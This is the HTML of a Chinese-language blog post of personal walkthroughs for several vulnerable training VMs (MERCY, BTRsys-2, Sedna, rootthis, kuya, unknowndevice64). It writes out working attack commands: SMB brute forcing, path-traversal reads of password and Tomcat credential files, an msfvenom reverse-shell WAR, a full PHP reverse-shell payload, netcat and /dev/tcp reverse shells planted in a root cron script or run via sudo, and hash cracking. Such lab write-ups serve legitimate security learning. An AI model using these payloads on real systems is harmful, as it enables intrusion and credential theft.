@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content>
+  <meta name="author" content="disshu">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="渗透实战笔记II">
+  <meta property="og:description" content>
+  <meta property="og:site_name" content="disshu">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://yoursite.com">
+  
+    <link rel="alternate" href="/atom.xml" title="disshu" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>disshu</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/disshu.github.io/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/disshu.github.io/css/style.dark.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/disshu.github.io//img/cumt.png)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">渗透实战笔记II</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/disshu.github.io/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/disshu.github.io/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://github.com/disshu">
+                  
+                  Github
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="mailto:15695257867@163.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By disshu</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2020-03-04</span>
+            <span class="time">07:02:39</span>
+          </span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <h1 id="MERCY渗透实战"><a href="#MERCY渗透实战" class="headerlink" title="MERCY渗透实战"></a>MERCY渗透实战</h1><p>这个靶机偏难,学到了很多<br>日常扫目录 注意一点 80被墙了<br>没有用平常的扫描<br><code>nmap -sV xx</code>才能扫到<br>扫到了smb,这里还不是很熟悉,用e4l扫描smb目录<br><code>enum4linux -S xxxxxxx</code><br>利用smbclient进入<br><code>smbclient //10.211.55.20/qiu</code><br>但发现需要身份认证,扫描8080的manager需要账号密码,无头绪<br>再利用e4l -U xxxxx<br>查用户名 把它放到username.txt 然后去爆破吧,需要一个像样的字典,这里还是用了/usr/share/wordlists里的,还需要多收集<br><code>hydra -L username.txt -P /usxxxx/ smb://10.211.55.20 -s 139</code><br>利用smblient 目录 -U 用户名登陆<br>输入密码,进入smb目录,只能ls和cd<br>下载文件需要get get里面的config config文件对渗透很重要<br>里面有端口敲门 就是利用里面的序列号关闭端口和打开端口,明显80就是被关闭了<br>利用脚本打开</p>
+<pre><code class="hljs undefined"><span class="hljs-meta">#!/bin/bash</span>
+<span class="hljs-comment">#ip和端口，可以自己修改</span>
+<span class="hljs-keyword">for</span> PORT <span class="hljs-keyword">in</span> 159 27391 4;<span class="hljs-keyword">do</span> nmap -Pn 192.168.8.138  -p  <span class="hljs-variable">$PORT</span>;
+
+<span class="hljs-keyword">done</span></code></pre>
+
+<p>同理 ssh也一样,打开80端口后的robots.txt进入里面的目录<br>/nomercy 查一下cms漏洞<br>searchsploit rips 果然有<br>文件包含漏洞 <code>http://localhost/nomercy//windows/code.php?file=../../../../../../etc/passwd</code><br>去读取8080让我们读的文件<br><code>http://10.211.55.20/nomercy/windows/code.php?file=../../../../../../etc/tomcat7/tomcat-users.xml</code><br>里面有账号密码 登陆8080/manager的页面<br>查看是Linux 32位的<br>war上传反弹shell<br><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.8.253  LPORT=4444 -f war -o shell.war</code><br>上传成功 在本地 7z l shell.war<br>查看解压的jsp文件去访问<br>访问 <a href="http://10.211.55.20/shell/srmuaplwm.jsp" target="_blank" rel="noopener">http://10.211.55.20/shell/srmuaplwm.jsp</a> 触发反弹<br>nc -lvp 4444<br>进入目录拿python切一下<br>su qiu<br>进入之前的private文件<br>la -al<br>查看到有个timeclock.sh是靠root运行的,写shell进去岂不是可以执行了<br><code>echo &quot;rm -rf /tmp/p; mknod /tmp/p p; /bin/sh 0&lt;/tmp/p | nc 192.168.8.253 5555 1&gt;/tmp/p&quot; &gt;&gt; timeclock</code><br>nc -lvp 5555    三分钟监听一次</p>
+<h1 id="BTRsys-2渗透"><a href="#BTRsys-2渗透" class="headerlink" title="BTRsys-2渗透"></a>BTRsys-2渗透</h1><p>扫描又是wordpress 利用author爆出用户<br><a href="http://192.168.8.134/wordpress/?author=1" target="_blank" rel="noopener">http://192.168.8.134/wordpress/?author=1</a> 爆出用户“btrisk”</p>
+<p><a href="http://192.168.8.134/wordpress/?author=2" target="_blank" rel="noopener">http://192.168.8.134/wordpress/?author=2</a> 爆出用户 “admin”<br>可以爆破密码 admin密码也是admin<br>上去发现有个php<br>可写</p>
+<pre><code class="hljs undefined"><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">/**/</span> error_reporting(<span class="hljs-number">0</span>); $ip = <span class="hljs-string">'192.168.88.174'</span>; $port = <span class="hljs-number">4444</span>; <span class="hljs-keyword">if</span> (($f = <span class="hljs-string">'stream_socket_client'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(<span class="hljs-string">"tcp://&#123;$ip&#125;:&#123;$port&#125;"</span>); $s_type = <span class="hljs-string">'stream'</span>; &#125; <span class="hljs-keyword">if</span> (!$s &amp;&amp; ($f = <span class="hljs-string">'fsockopen'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = <span class="hljs-string">'stream'</span>; &#125; <span class="hljs-keyword">if</span> (!$s &amp;&amp; ($f = <span class="hljs-string">'socket_create'</span>) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); <span class="hljs-keyword">if</span> (!$res) &#123; <span class="hljs-keyword">die</span>(); &#125; $s_type = <span class="hljs-string">'socket'</span>; &#125; <span class="hljs-keyword">if</span> (!$s_type) &#123; <span class="hljs-keyword">die</span>(<span class="hljs-string">'no socket funcs'</span>); &#125; <span class="hljs-keyword">if</span> (!$s) &#123; <span class="hljs-keyword">die</span>(<span class="hljs-string">'no socket'</span>); &#125; <span class="hljs-keyword">switch</span> ($s_type) &#123; <span class="hljs-keyword">case</span> <span class="hljs-string">'stream'</span>: $len = fread($s, <span class="hljs-number">4</span>); <span class="hljs-keyword">break</span>; <span class="hljs-keyword">case</span> <span class="hljs-string">'socket'</span>: $len = socket_read($s, <span class="hljs-number">4</span>); <span class="hljs-keyword">break</span>; &#125; <span class="hljs-keyword">if</span> (!$len) &#123; <span class="hljs-keyword">die</span>(); &#125; $a = unpack(<span class="hljs-string">"Nlen"</span>, $len); $len = $a[<span class="hljs-string">'len'</span>]; $b = <span class="hljs-string">''</span>; <span class="hljs-keyword">while</span> (strlen($b) &lt; $len) &#123; <span class="hljs-keyword">switch</span> ($s_type) &#123; <span class="hljs-keyword">case</span> <span class="hljs-string">'stream'</span>: $b .= fread($s, $len-strlen($b)); <span class="hljs-keyword">break</span>; <span class="hljs-keyword">case</span> <span class="hljs-string">'socket'</span>: $b .= socket_read($s, $len-strlen($b)); <span class="hljs-keyword">break</span>; &#125; &#125; $GLOBALS[<span class="hljs-string">'msgsock'</span>] = $s; $GLOBALS[<span class="hljs-string">'msgsock_type'</span>] = $s_type; <span class="hljs-keyword">if</span> (extension_loaded(<span class="hljs-string">'suhosin'</span>) &amp;&amp; ini_get(<span class="hljs-string">'suhosin.executor.disable_eval'</span>)) &#123; $suhosin_bypass=create_function(<span class="hljs-string">''</span>, $b); $suhosin_bypass(); &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-keyword">eval</span>($b); &#125; <span class="hljs-keyword">die</span>();</span></code></pre>
+
+<p>kali反监听<br>cd wordpress<br>cat wp-config.php查看sql语句即可</p>
+<h1 id="Sedna"><a href="#Sedna" class="headerlink" title="Sedna"></a>Sedna</h1><p>扫目录发现license.txt<br>搜到Copyright (c) 2012 - 2015 BuilderEngine / Radian Enterprise Systems Limited.<br>去找漏洞，是一个post上传漏洞<br>searchsploit一下<br><code>curl -F &quot;files=@php-reserve-shell.php&quot; http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/index.php</code><br>反弹shell 是一个脏牛提权<br>但是靶机崩了</p>
+<h1 id="rootthis"><a href="#rootthis" class="headerlink" title="rootthis"></a>rootthis</h1><p>这个也是崩的<br>有drual站点 是有漏洞的但是崩了<br>有个backup 系统备份文件 unzip 需要破解<br>用上了 fcrackzip rockyou 还是 /usr/share/wordlists里的<br><code>fcrackzip -b -D -p rockyou.txt -u backup.zip</code><br>里面发现了</p>
+<pre><code class="hljs undefined">INSERT INTO `user` VALUES ('localhost','root','*7AFEAE<span class="hljs-number">5774</span>E<span class="hljs-number">67299625</span>1E09B946CB<span class="hljs-number">3953</span>FC<span class="hljs-number">6765</span>6','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','','','','',<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,'unix_socket','','N','N','',<span class="hljs-number">0.000000</span>),('localhost','webman','*9AF2F8E8C<span class="hljs-number">0816</span>5DC70FA4B4F8D40EA6EC84CB6D2','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','N','','','','',<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,'','','N','N','',<span class="hljs-number">0.000000</span>)
+;</code></pre>
+
+<p>用john –wordlist=rockyou.txt破解</p>
+<h1 id="kuya"><a href="#kuya" class="headerlink" title="kuya"></a>kuya</h1><p>扫描目录进靶机 查看源代码 发现有hint<br>/loot有很多照片 存在隐写<br><code>steghide extract -ef *.jpg</code><br>其中有一个是pcapng<br>打开wireshark 导出选择http，是个7z<br>普通rcrack不能破解<br>选择kali中7z2john locate 7z2john 但是是perl文件 没有配置 以后再说吧<br>解压是id_rsa ssh2john id_rsa&gt;key<br>john key<br>ssh -i id_rsa <a href="mailto:test@10.211.55.23" target="_blank" rel="noopener">test@10.211.55.23</a><br>输入密码<br>进去后 其实之前发现有wordpress站点 找一下wp-config.php<br>果然后密码账号<br>su kuya<br>ls 里面有bash_history 记录操作的</p>
+<pre><code class="hljs undefined"><span class="hljs-keyword">cd</span> <span class="hljs-string">/home/kuya</span>
+chown -R kuya
+chown -R kuya <span class="hljs-string">/home/kiya</span>
+chown -R kuya <span class="hljs-string">/home/kuya</span>
+su root
+<span class="hljs-keyword">cd</span> <span class="hljs-string">/home/kuya</span>
+cat <span class="hljs-string">/etc/shadow</span>
+<span class="hljs-string">./tar</span> -cvf shadow.tar <span class="hljs-string">/etc/shadow</span>
+tar -cvf shadow.tar <span class="hljs-string">/etc/shadow</span>
+which tar
+getcap -r / 2&gt;<span class="hljs-string">/dev/null</span>
+setcap cap_dac_read_search=ep
+exit</code></pre>
+
+<p>setcap cap_dac_read_search=ep 里面有这样一句话<br>setcap 命令可以持久化的将权限付给可执行文件<br>这个是之前有人把root权限给了tar 所以我们可以之后可以利用这句话</p>
+<pre><code class="hljs undefined">tar cvf <span class="hljs-built_in">shadow</span>.tar /root
+tar xvf <span class="hljs-built_in">shadow</span>.tar</code></pre>
+
+<p>直接把root里的信息发到shadow.tar里</p>
+<h1 id="unknowndevice64-V1-0"><a href="#unknowndevice64-V1-0" class="headerlink" title="unknowndevice64-V1.0"></a>unknowndevice64-V1.0</h1><p>知识点主要是隐写图片<br>还是利用<br><code>steghide extract -sf key_is_h1dd3n.jpg</code><br>主要这个rbash提权<br>之前也写过了但还是忘了<br>进入vi后<br>:!/bin/bash<br>2、将/bin/bash导出到shell环境变量，将/usr/bin目录导出到PATH环境变量：<br>export SHELL=/bin/bash:$SHELL<br>export PATH=/usr/bin:$PATH<br>然后sudo -l看有什么可以运行的<br>有个sysud64 我们sudo sysud64 -h<br>发现有个-o参数 可以输出文件 我们都知道linux万物皆文件<br>我们可以将root的shell 提到我们这个权限中<br><code>sudo sysud64 -o /dev/null /bin/sh</code><br>或者直接监听<br><code>sudo sysud64 -uroot /bin/bash -c &quot;/bin/sh -i &gt;&amp; /dev/tcp/172.17.135.75/4444 0&gt;&amp;1&quot;</code></p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        <p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/disshu.github.io/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
